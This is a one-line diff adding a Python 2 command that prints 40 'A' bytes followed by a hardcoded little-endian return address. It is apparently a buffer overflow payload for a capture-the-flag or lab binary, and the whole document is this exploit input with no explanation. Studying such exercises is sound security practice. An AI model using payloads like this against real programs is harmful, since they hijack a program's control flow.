@@ -1,0 +1,1 @@
+python -c 'print "A"*40+"\x66\x07\x40\x00\x00"'
